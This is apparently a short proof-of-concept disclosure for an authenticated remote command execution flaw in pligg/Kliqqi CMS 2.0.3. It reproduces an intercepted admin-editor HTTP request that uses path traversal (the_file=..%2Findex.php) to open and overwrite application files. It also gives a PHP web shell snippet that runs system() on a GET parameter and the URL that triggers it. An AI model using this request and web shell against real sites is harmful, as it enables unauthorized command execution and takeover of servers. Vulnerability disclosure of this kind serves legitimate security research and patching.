# pligg

## pligg 2.0.3 - CVE 

* Description : 
* Affected version : 2.0.3

### Information

To make this PoC, i just installed the sofware(`https://github.com/Kliqqi-CMS/Kliqqi-CMS`) using WAMP on Windows

* Vulnerability Type : Remote command execution (Authenticated RCE)

### POC 

<img width="1280" alt="receStore" src="https://raw.githubusercontent.com/jenaye/aapanel/master/start.png">

Go to `/admin/admin_editor.php` intercept the request and the change path to file.


for exemple to get `index.php` of application :

<img width="1280" alt="receStore" src="https://raw.githubusercontent.com/jenaye/aapanel/master/getindex.png">



```
POST /admin/admin_editor.php HTTP/1.1
Host: kliqqi
Content-Length: 33
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://kliqqi
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://kliqqi/admin/admin_editor.php
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: panelState=CollapseManage%7CCollapseSettings%7CCollapseTemplate; PHPSESSID=lfpns7pkc3gtrv5o1golmt5md3; mnm_user=Admin; mnm_key=QWRtaW46MjI0R2dEVTAxZncxZzpl
Connection: close

the_file=..%2Findex.php&open=Open
```


just click on "show response in browser", and edit the file like you want

<img width="1280" alt="receStore" src="https://raw.githubusercontent.com/jenaye/aapanel/master/write.png">

for exemple : 

```php
  if($_GET['cmd']){
    system($_GET['cmd']);
}
```

finaly go to `website.fr?cmd=dir`.

<img width="1280" alt="receStore" src="https://raw.githubusercontent.com/jenaye/aapanel/master/rce.png">